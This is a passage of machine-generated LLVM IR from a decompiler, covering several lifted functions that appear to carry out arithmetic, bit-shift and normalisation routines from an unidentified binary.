  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17f30 = load i32, i32* %r1.global-to-local, align 4
  %v3_17f34 = icmp ult i32 %v0_17f30, 1048574
  br i1 %v3_17f34, label %dec_label_pc_17f78, label %dec_label_pc_17f38

dec_label_pc_17f38:                               ; preds = %dec_label_pc_17f30
  %v3_17f3c = icmp ult i32 %v0_17f30, 2097150
  br i1 %v3_17f3c, label %dec_label_pc_17f5c, label %dec_label_pc_17f40

dec_label_pc_17f40:                               ; preds = %dec_label_pc_17f38
  %v1_17f40 = urem i32 %v0_17f30, 2
  %v2_17f40 = icmp ne i32 %v1_17f40, 0
  %v3_17f40 = udiv i32 %v0_17f30, 2
  store i32 %v3_17f40, i32* %r1.global-to-local, align 4
  %v0_17f44 = load i32, i32* %r0.global-to-local, align 4
  %v3_17f44 = zext i1 %v2_17f40 to i32
  %v6_17f44 = zext i32 %v0_17f44 to i64
  %v7_17f44 = sub i32 33, %v0_17f44
  %v8_17f44 = zext i32 %v7_17f44 to i64
  %v9_17f44 = shl i64 %v6_17f44, %v8_17f44
  %v10_17f44 = sub i32 32, %v0_17f44
  %v11_17f44 = shl i32 %v3_17f44, %v10_17f44
  %v12_17f44 = zext i32 %v11_17f44 to i64
  %v14_17f44 = or i64 %v12_17f44, %v9_17f44
  %v15_17f44 = trunc i64 %v14_17f44 to i32
  %v16_17f44 = add i32 %v0_17f44, -1
  %v17_17f44 = shl i32 1, %v16_17f44
  %v18_17f44 = and i32 %v17_17f44, %v0_17f44
  %v19_17f44 = icmp ne i32 %v18_17f44, 0
  store i32 %v15_17f44, i32* %r0.global-to-local, align 4
  %v0_17f48 = load i32, i32* @ip, align 4
  %v3_17f48 = zext i1 %v19_17f44 to i32
  %v6_17f48 = zext i32 %v0_17f48 to i64
  %v7_17f48 = sub i32 33, %v0_17f48
  %v8_17f48 = zext i32 %v7_17f48 to i64
  %v9_17f48 = shl i64 %v6_17f48, %v8_17f48
  %v10_17f48 = sub i32 32, %v0_17f48
  %v11_17f48 = shl i32 %v3_17f48, %v10_17f48
  %v12_17f48 = zext i32 %v11_17f48 to i64
  %v14_17f48 = or i64 %v12_17f48, %v9_17f48
  %v15_17f48 = trunc i64 %v14_17f48 to i32
  store i32 %v15_17f48, i32* @ip, align 4
  %v0_17f4c = load i32, i32* @r4, align 4
  %v1_17f4c = add i32 %v0_17f4c, 1
  store i32 %v1_17f4c, i32* @r4, align 4
  %v3_17f50 = mul i32 %v1_17f4c, 2097152
  %v2_17f54 = icmp ugt i32 %v3_17f50, -4194305
  call void @__pseudo_cond_branch(i1 %v2_17f54, i32 ptrtoint (i32* @global_var_1810c.727 to i32))
  br label %dec_label_pc_17f5c

dec_label_pc_17f5c:                               ; preds = %dec_label_pc_17f78, %dec_label_pc_17f38, %dec_label_pc_17f40
  %v0_17f5c = load i32, i32* @ip, align 4
  %v2_17f5c = icmp slt i32 %v0_17f5c, 0
  %v6_17f5c = icmp eq i32 %v0_17f5c, -2147483648
  %v1_17f60 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17f5c, label %bb, label %dec_label_pc_17f5c._crit_edge

bb:                                               ; preds = %dec_label_pc_17f5c
  %v2_17f60 = urem i32 %v1_17f60, 2
  %v3_17f60 = icmp ne i32 %v2_17f60, 0
  br label %dec_label_pc_17f5c._crit_edge

dec_label_pc_17f5c._crit_edge:                    ; preds = %dec_label_pc_17f5c, %bb
  %v1_17f64 = phi i1 [ %v3_17f60, %bb ], [ %v2_17f5c, %dec_label_pc_17f5c ]
  %v2_17f64 = zext i1 %v1_17f64 to i32
  %v3_17f64 = add i32 %v2_17f64, %v1_17f60
  store i32 %v3_17f64, i32* %r0.global-to-local, align 4
  %v0_17f68 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f68 = load i32, i32* @r4, align 4
  %v2_17f68 = and i32 %v1_17f68, 4096
  %v3_17f68 = icmp ne i32 %v2_17f68, 0
  %v4_17f68 = mul i32 %v1_17f68, 1048576
  %v6_17f68 = add i32 %v4_17f68, %v0_17f68
  %v7_17f68 = zext i1 %v3_17f68 to i32
  %v8_17f68 = add i32 %v7_17f68, %v6_17f68
  %v1_17f6c = load i32, i32* @r5, align 4
  %v2_17f6c = or i32 %v1_17f6c, %v8_17f68
  store i32 %v2_17f6c, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v3_17f64

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17f30
  %v0_17f78 = load i32, i32* @ip, align 4
  %v1_17f78 = icmp slt i32 %v0_17f78, 0
  %v2_17f78 = mul i32 %v0_17f78, 2
  store i32 %v2_17f78, i32* @ip, align 4
  %v0_17f7c = load i32, i32* %r0.global-to-local, align 4
  %v3_17f7c = mul i32 %v0_17f7c, 2
  %v4_17f7c = zext i1 %v1_17f78 to i32
  %v5_17f7c = or i32 %v3_17f7c, %v4_17f7c
  store i32 %v5_17f7c, i32* %r0.global-to-local, align 4
  %v9_17f7c = icmp ule i32 %v5_17f7c, %v0_17f7c
  %v10_17f7c = icmp ult i32 %v3_17f7c, %v0_17f7c
  %v11_17f7c = select i1 %v1_17f78, i1 %v9_17f7c, i1 %v10_17f7c
  %v3_17f80 = mul i32 %v0_17f30, 2
  %v4_17f80 = zext i1 %v11_17f7c to i32
  %v5_17f80 = or i32 %v4_17f80, %v3_17f80
  store i32 %v5_17f80, i32* %r1.global-to-local, align 4
  %v1_17f84 = and i32 %v3_17f80, 1048576
  %v2_17f84 = icmp eq i32 %v1_17f84, 0
  %v0_17f88 = load i32, i32* @r4, align 4
  %v1_17f88 = add i32 %v0_17f88, -1
  store i32 %v1_17f88, i32* @r4, align 4
  br i1 %v2_17f84, label %bb7, label %dec_label_pc_17f5c

bb7:                                              ; preds = %dec_label_pc_17f78
  ret i32 %v5_17f7c

; uselistorder directives
  uselistorder i32 %v0_17f7c, { 1, 2, 0 }
  uselistorder i1 %v1_17f78, { 1, 0 }
  uselistorder i32 %v1_17f60, { 1, 0 }
  uselistorder i32 %v0_17f5c, { 1, 0 }
  uselistorder i32 %v0_17f48, { 1, 0, 2 }
  uselistorder i32 %v0_17f44, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17f5c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17f5c, { 0, 2, 1 }
}

define i32 @function_17f90() local_unnamed_addr {
dec_label_pc_17f90:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_17f90 = load i32, i32* @r1, align 4
  %v2_17f90 = icmp eq i32 %v0_17f90, 0
  br i1 %v2_17f90, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_17f90
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_17f90
  %v1_17f9c10 = load i32, i32* @r0, align 4
  store i32 %v1_17f9c10, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_17ff8 = phi i32 [ %v0_17f90, %bb ], [ %v1_17f9c10, %bb38 ]
  %v1_17fb0 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_17fa8 = icmp ugt i32 %v0_17ff8, 65535
  br i1 %v2_17fa8, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_17fac = and i32 %v0_17ff8, 32768
  %v3_17fac = icmp eq i32 %v2_17fac, 0
  %v4_17fac = udiv i32 %v0_17ff8, 65536
  br i1 %v3_17fac, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_17fb0 = add nsw i32 %v1_17fb0, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_17fbc = phi i32 [ %v1_17fb0, %.thread ], [ %v1_17fb0, %bb39 ], [ %v2_17fb0, %bb40 ]
  %v1_17fb8 = phi i32 [ %v0_17ff8, %.thread ], [ %v4_17fac, %bb39 ], [ %v4_17fac, %bb40 ]
  %v2_17fb4 = icmp ugt i32 %v1_17fb8, 255
  br i1 %v2_17fb4, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_17fb8 = and i32 %v1_17fb8, 128
  %v3_17fb8 = icmp eq i32 %v2_17fb8, 0
  %v4_17fb8 = udiv i32 %v1_17fb8, 256
  br i1 %v3_17fb8, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_17fbc = add nsw i32 %v1_17fbc, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_17fc8 = phi i32 [ %v1_17fbc, %.thread3 ], [ %v1_17fbc, %bb41 ], [ %v2_17fbc, %bb42 ]
  %v1_17fc4 = phi i32 [ %v1_17fb8, %.thread3 ], [ %v4_17fb8, %bb41 ], [ %v4_17fb8, %bb42 ]
  %v2_17fc0 = icmp ugt i32 %v1_17fc4, 15
  br i1 %v2_17fc0, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_17fc4 = and i32 %v1_17fc4, 8
  %v3_17fc4 = icmp eq i32 %v2_17fc4, 0
  %v4_17fc4 = udiv i32 %v1_17fc4, 16
  br i1 %v3_17fc4, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_17fc8 = add nsw i32 %v1_17fc8, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_17fd0 = phi i32 [ %v1_17fc8, %.thread4 ], [ %v1_17fc8, %bb43 ], [ %v2_17fc8, %bb44 ]
  %v1_17fd8 = phi i32 [ %v1_17fc4, %.thread4 ], [ %v4_17fc4, %bb43 ], [ %v4_17fc4, %bb44 ]
  %v2_17fcc = icmp ugt i32 %v1_17fd8, 3
  br i1 %v2_17fcc, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_17fd0 = add i32 %v1_17fd0, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_17fd4 = udiv i32 %v1_17fd8, 2
  %v6_17fd4 = sub i32 %v1_17fd0, %v5_17fd4
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_17fd8 = phi i32 [ %v6_17fd4, %.thread6 ], [ %v2_17fd0, %bb45 ]
  %v4_17fd8 = udiv i32 %v1_17fd8, 8
  %v5_17fd8 = sub i32 %v0_17fd8, %v4_17fd8
  store i32 %v5_17fd8, i32* @r3, align 4
  %v2_17fdc = add i32 %v5_17fd8, -32
  %v4_17fdc = sub i32 31, %v5_17fd8
  %v5_17fdc = and i32 %v4_17fdc, %v5_17fd8
  %v8_17fdc = icmp eq i32 %v5_17fd8, 32
  %v6_17fe0 = icmp slt i32 %v5_17fd8, 32
  br i1 %v6_17fe0, label %dec_label_pc_17fe4, label %dec_label_pc_18004

dec_label_pc_17fe4:                               ; preds = %bb46
  %v2_17fe4 = add i32 %v5_17fd8, -20
  %v7_17fe8 = icmp sgt i32 %v2_17fdc, -12
  br i1 %v7_17fe8, label %dec_label_pc_17fec, label %dec_label_pc_18000

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fe4
  store i32 %v5_17fd8, i32* @ip, align 4
  %v1_17ff0 = sub i32 32, %v5_17fd8
  %v6_17ff4 = shl i32 %v0_17ff8, %v5_17fd8
  store i32 %v6_17ff4, i32* @r0, align 4
  %v6_17ff8 = lshr i32 %v0_17ff8, %v1_17ff0
  store i32 %v6_17ff8, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_18000:                               ; preds = %dec_label_pc_17fe4
  %v8_17fe4 = icmp eq i32 %v2_17fe4, 0
  %v4_17fe4 = add i32 %v5_17fd8, 2147483616
  %v5_17fe4 = and i32 %v2_17fe4, %v4_17fe4
  br label %dec_label_pc_18004

dec_label_pc_18004:                               ; preds = %bb46, %dec_label_pc_18000
  %v1_18010.in = phi i32 [ %v2_17fdc, %bb46 ], [ %v2_17fe4, %dec_label_pc_18000 ]
  %v6_18010 = phi i32 [ %v2_17fdc, %bb46 ], [ %v5_17fd8, %dec_label_pc_18000 ]
  %v2_18010.in = phi i32 [ %v5_17fdc, %bb46 ], [ %v5_17fe4, %dec_label_pc_18000 ]
  %v0_18010 = phi i1 [ %v8_17fdc, %bb46 ], [ %v8_17fe4, %dec_label_pc_18000 ]
  %v1_18010 = icmp slt i32 %v1_18010.in, 0
  %v2_18010 = icmp slt i32 %v2_18010.in, 0
  %v3_18004 = xor i1 %v2_18010, %v1_18010
  %v4_18004 = or i1 %v0_18010, %v3_18004
  br i1 %v4_18004, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_18004
  %v6_18004 = sub i32 32, %v6_18010
  store i32 %v6_18004, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_18004, %bb47
  %v6_18008 = shl i32 %v0_17ff8, %v6_18010
  store i32 %v6_18008, i32* %r1.global-to-local, align 4
  br i1 %v4_18004, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1800c = load i32, i32* @r0, align 4
  %v7_1800c = load i32, i32* @ip, align 4
  %v12_1800c = lshr i32 %v6_1800c, %v7_1800c
  %v13_1800c = or i32 %v12_1800c, %v6_18008
  store i32 %v13_1800c, i32* %r1.global-to-local, align 4
  %v11_18010 = shl i32 %v6_1800c, %v6_18010
  store i32 %v11_18010, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_17fec, %bb49
  %v6_18018 = phi i32 [ %v6_17ff8, %dec_label_pc_17fec ], [ %v13_1800c, %bb49 ], [ %v6_18008, %bb48 ]
  %v0_18014 = load i32, i32* @r4, align 4
  %v2_18014 = sub i32 %v0_18014, %v5_17fd8
  store i32 %v2_18014, i32* %r4.global-to-local, align 4
  %v4_18014 = xor i32 %v0_18014, %v5_17fd8
  %v5_18014 = xor i32 %v2_18014, %v0_18014
  %v6_18014 = and i32 %v5_18014, %v4_18014
  %v7_18014 = icmp slt i32 %v6_18014, 0
  %v8_18014 = icmp slt i32 %v2_18014, 0
  %v5_18018 = icmp slt i32 %v0_18014, %v5_17fd8
  br i1 %v5_18018, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_18018 = mul i32 %v2_18014, 1048576
  %v11_18018 = add i32 %v10_18018, %v6_18018
  %v7_1801c = load i32, i32* @r5, align 4
  %v8_1801c = or i32 %v7_1801c, %v11_18018
  store i32 %v8_1801c, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_18024 = xor i1 %v8_18014, %v7_18014
  %v4_18024 = xor i1 %v3_18024, true
  call void @__pseudo_cond_branch(i1 %v4_18024, i32 %tmp33)
  %v0_18028 = load i32, i32* %r4.global-to-local, align 4
  %v2_1802c = sub i32 -32, %v0_18028
  store i32 %v2_1802c, i32* %r4.global-to-local, align 4
  %v6_18030 = icmp sgt i32 %v0_18028, -32
  br i1 %v6_18030, label %dec_label_pc_18034, label %dec_label_pc_18074

dec_label_pc_18034:                               ; preds = %.thread8
  %v1_18034 = add i32 %v2_1802c, 12
  store i32 %v1_18034, i32* %r4.global-to-local, align 4
  %v8_18038 = icmp sgt i32 %v1_18034, 0
  br i1 %v8_18038, label %dec_label_pc_18058, label %dec_label_pc_1803c

dec_label_pc_1803c:                               ; preds = %dec_label_pc_18034
  %v1_1803c = add i32 %v2_1802c, 32
  %v1_18040 = sub i32 0, %v2_1802c
  %v0_18044 = load i32, i32* @r0, align 4
  %v6_18044 = lshr i32 %v0_18044, %v1_1803c
  %v1_18048 = load i32, i32* %r1.global-to-local, align 4
  %v7_18048 = shl i32 %v1_18048, %v1_18040
  %v8_18048 = or i32 %v7_18048, %v6_18044
  %v0_1804c = load i32, i32* @r5, align 4
  %v7_1804c = lshr i32 %v1_18048, %v1_1803c
  %v8_1804c = or i32 %v0_1804c, %v7_1804c
  store i32 %v8_1804c, i32* @r1, align 4
  %v2_18050 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_18050, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_18048

dec_label_pc_18058:                               ; preds = %dec_label_pc_18034
  %v1_18058 = sub i32 0, %v2_1802c
  %v1_1805c = add i32 %v2_1802c, 32
  %v0_18060 = load i32, i32* @r0, align 4
  %v6_18060 = lshr i32 %v0_18060, %v1_1805c
  %v1_18064 = load i32, i32* %r1.global-to-local, align 4
  %v7_18064 = shl i32 %v1_18064, %v1_18058
  %v8_18064 = or i32 %v7_18064, %v6_18060
  %v0_18068 = load i32, i32* @r5, align 4
  store i32 %v0_18068, i32* @r1, align 4
  %v2_1806c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1806c, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_18064

dec_label_pc_18074:                               ; preds = %.thread8
  %v0_18074 = load i32, i32* %r1.global-to-local, align 4
  %v6_18074 = lshr i32 %v0_18074, %v2_1802c
  %v0_18078 = load i32, i32* @r5, align 4
  store i32 %v0_18078, i32* @r1, align 4
  %v2_1807c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1807c, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v6_18074

; uselistorder directives
  uselistorder i32 %v2_1802c, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_18014, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18014, { 2, 0, 1, 3 }
  uselistorder i32 %v6_18008, { 1, 0, 2 }
  uselistorder i32 %v2_17fdc, { 1, 0, 2 }
  uselistorder i32 %v5_17fd8, { 6, 0, 5, 7, 3, 9, 2, 8, 4, 10, 11, 1, 13, 12, 14 }
  uselistorder i32 %v4_17fc4, { 1, 0 }
  uselistorder i32 %v1_17fc4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17fb8, { 1, 0 }
  uselistorder i32 %v1_17fb8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17fac, { 1, 0 }
  uselistorder i32 %v0_17ff8, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 0, 1, 2, 6, 7 }
  uselistorder i32 -12, { 2, 0, 1, 3, 15, 16, 4, 18, 19, 5, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 6, 8, 7, 26, 27, 28 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 12, 11, 13, 2, 4, 5, 3, 14, 15, 16, 0, 8, 7, 17, 22, 20, 23, 24, 25, 6, 1, 10, 9, 21, 18, 19 }
  uselistorder i32 -4, { 20, 0, 1, 49, 21, 56, 22, 23, 74, 75, 76, 8, 24, 25, 26, 77, 78, 79, 9, 27, 28, 29, 80, 81, 82, 10, 30, 31, 83, 19, 18, 84, 85, 86, 17, 16, 15, 14, 32, 33, 34, 35, 36, 7, 37, 5, 38, 6, 87, 13, 39, 46, 47, 48, 40, 12, 61, 62, 63, 11, 64, 65, 66, 41, 60, 2, 42, 50, 51, 52, 53, 54, 55, 67, 68, 69, 70, 71, 72, 43, 73, 57, 58, 59, 44, 4, 3, 45 }
  uselistorder i32 15, { 8, 3, 11, 4, 5, 6, 7, 0, 12, 1, 13, 2, 9, 10 }
  uselistorder i32 -8, { 13, 14, 0, 35, 15, 16, 17, 18, 19, 20, 12, 11, 4, 10, 9, 8, 7, 21, 22, 23, 24, 25, 36, 41, 26, 27, 28, 29, 30, 38, 42, 31, 43, 34, 6, 32, 33, 1, 39, 40, 5, 2, 3, 37 }
  uselistorder i32 128, { 16, 8, 9, 6, 7, 10, 19, 24, 0, 1, 2, 11, 12, 20, 21, 22, 3, 4, 13, 23, 5, 17, 18, 15, 14 }
  uselistorder i32 255, { 12, 6, 16, 17, 5, 7, 8, 15, 0, 1, 2, 3, 18, 13, 14, 9, 10, 11, 4 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 5, 4, 3, 1, 16, 17, 18, 19, 20, 21, 2, 0, 22 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 57, 30, 56, 53, 54, 55, 58, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 43, 42, 46, 45, 44, 47, 49, 48, 50, 52, 51 }
  uselistorder i32 32768, { 5, 2, 0, 1, 6, 4, 3 }
  uselistorder i32 65535, { 1, 0, 2, 3 }
  uselistorder i32 52, { 1, 19, 16, 14, 15, 20, 21, 3, 22, 0, 23, 24, 5, 6, 7, 9, 8, 10, 12, 17, 25, 13, 26, 11, 27, 4, 2, 18 }
  uselistorder i32 20, { 5, 30, 31, 2, 7, 43, 0, 35, 32, 29, 46, 8, 47, 48, 3, 49, 44, 11, 36, 37, 26, 27, 28, 21, 12, 22, 23, 1, 50, 13, 14, 51, 33, 34, 4, 6, 38, 39, 40, 41, 45, 15, 24, 16, 10, 9, 17, 25, 18, 19, 20, 42 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_18004, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_18084(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_18084:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_18084 = load i32, i32* @r4, align 4
  %v2_18084 = icmp eq i32 %v0_18084, 0
  %v1_18088 = xor i32 %arg3, 1048576
  store i32 %v1_18088, i32* @r3, align 4
  br i1 %v2_18084, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_18084
  %v1_1808c = load i32, i32* @r1, align 4
  %v2_1808c = xor i32 %v1_1808c, 1048576
  store i32 %v2_1808c, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_18084
  %v1_18094 = load i32, i32* @r5, align 4
  %v2_18094 = add i32 %v1_18094, -1
  store i32 %v2_18094, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_18098 = call i32 @function_17edc()
  store i32 %v0_18098, i32* %r0.global-to-local, align 4
  %v0_1809c = load i32, i32* @r4, align 4
  %v0_1809c.off = add i32 %v0_1809c, 4194303
  %tmp = icmp ult i32 %v0_1809c.off, 2097152
  %v1_1812c = load i32, i32* @r5, align 4
  %v1_1812c.off = add i32 %v1_1812c, 4194303
  %tmp44 = icmp ult i32 %v1_1812c.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_180a8

dec_label_pc_180a8:                               ; preds = %bb30
  %v4_180a8 = icmp eq i32 %v1_1812c, %v0_1809c
  br i1 %v4_180a8, label %bb31, label %dec_label_pc_180b4

bb31:                                             ; preds = %dec_label_pc_180a8
  %v2_180ac = load i32, i32* @r2, align 4
  %v5_180ac = icmp eq i32 %v2_180ac, %v0_18098
  br i1 %v5_180ac, label %dec_label_pc_180c8, label %dec_label_pc_180b4

dec_label_pc_180b4:                               ; preds = %dec_label_pc_180a8, %bb31
  %v2_180b4 = or i32 %v0_1809c, %v0_18098
  %v4_180b4 = icmp eq i32 %v2_180b4, 0
  br i1 %v4_180b4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_180b4
  %v1_180bc = load i32, i32* @r2, align 4
  store i32 %v1_180bc, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_180b4, %bb32
  %v1_180c4 = phi i32 [ %v0_18098, %dec_label_pc_180b4 ], [ %v1_180bc, %bb32 ]
  ret i32 %v1_180c4

dec_label_pc_180c8:                               ; preds = %bb31
  %v0_180c8 = load i32, i32* @r1, align 4
  %v1_180c8 = load i32, i32* @r3, align 4
  %v4_180c8 = icmp eq i32 %v1_180c8, %v0_180c8
  br i1 %v4_180c8, label %dec_label_pc_180c8..thread8_crit_edge, label %bb33

dec_label_pc_180c8..thread8_crit_edge:            ; preds = %dec_label_pc_180c8
  %v0_180d8.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_180c8
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_180c8..thread8_crit_edge, %bb33
  %v0_180d8 = phi i32 [ %v0_180d8.pre, %dec_label_pc_180c8..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_180d8 = xor i1 %v4_180c8, true
  call void @__pseudo_cond_branch(i1 %v2_180d8, i32 %v0_180d8)
  %v0_180dc = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_180dc, 2097152
  br i1 %tmp45, label %dec_label_pc_180e4, label %dec_label_pc_180f8

dec_label_pc_180e4:                               ; preds = %.thread8
  %v0_180e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_180e4 = icmp slt i32 %v0_180e4, 0
  %v2_180e4 = mul i32 %v0_180e4, 2
  store i32 %v2_180e4, i32* %r0.global-to-local, align 4
  %v0_180e8 = load i32, i32* @r1, align 4
  %v3_180e8 = mul i32 %v0_180e8, 2
  %v4_180e8 = zext i1 %v1_180e4 to i32
  %v5_180e8 = or i32 %v3_180e8, %v4_180e8
  %v9_180e8 = icmp ule i32 %v5_180e8, %v0_180e8
  %v10_180e8 = icmp ult i32 %v3_180e8, %v0_180e8
  %v11_180e8 = select i1 %v1_180e4, i1 %v9_180e8, i1 %v10_180e8
  br i1 %v11_180e8, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_180e4
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_180e4, %bb34
  ret i32 %v2_180e4

dec_label_pc_180f8:                               ; preds = %.thread8
  %v2_180f8 = icmp ugt i32 %v0_180dc, -4194305
  br i1 %v2_180f8, label %dec_label_pc_180f8..thread9_crit_edge, label %bb36

dec_label_pc_180f8..thread9_crit_edge:            ; preds = %dec_label_pc_180f8
  %v0_18104.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_180f8
  %v1_180fc = load i32, i32* @r1, align 4
  %v2_180fc = add i32 %v1_180fc, 1048576
  store i32 %v2_180fc, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_180f8..thread9_crit_edge, %bb36
  %v0_18104 = phi i32 [ %v0_18104.pre, %dec_label_pc_180f8..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_18104 = xor i1 %v2_180f8, true
  call void @__pseudo_cond_branch(i1 %v2_18104, i32 %v0_18104)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_18138.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_18138.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_18124 = load i32, i32* @r3, align 4
  %v1_18128 = load i32, i32* @r2, align 4
  store i32 %v1_18128, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1813823 = phi i32 [ %v1_18138.pre, %.thread14 ], [ %v1_18124, %bb37 ]
  %v1_18134 = phi i32 [ %v0_18098, %.thread14 ], [ %v1_18128, %bb37 ]
  store i32 %v1_18134, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_18144 = phi i32 [ %v1_1813823, %bb38 ], [ %v1_18138.pre, %.thread11 ]
  %v1_1814c = phi i32 [ %v1_18134, %bb38 ], [ %v0_18098, %.thread11 ]
  %v4_18138 = mul i32 %v1_18144, 4096
  %v5_18138 = or i32 %v4_18138, %v1_1814c
  %v7_18138 = icmp eq i32 %v5_18138, 0
  br i1 %v7_18138, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1813c = load i32, i32* @r2, align 4
  %v2_1813c = load i32, i32* @r3, align 4
  %v5_1813c = mul i32 %v2_1813c, 4096
  %v6_1813c = or i32 %v5_1813c, %v1_1813c
  %v8_1813c = icmp eq i32 %v6_1813c, 0
  br i1 %v8_1813c, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_18140 = icmp eq i32 %v2_1813c, %v1_18144
  br i1 %v5_18140, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1814c

; uselistorder directives
  uselistorder i32 %v1_18138.pre, { 0, 2, 1 }
  uselistorder i32 %v0_180e8, { 1, 2, 0 }
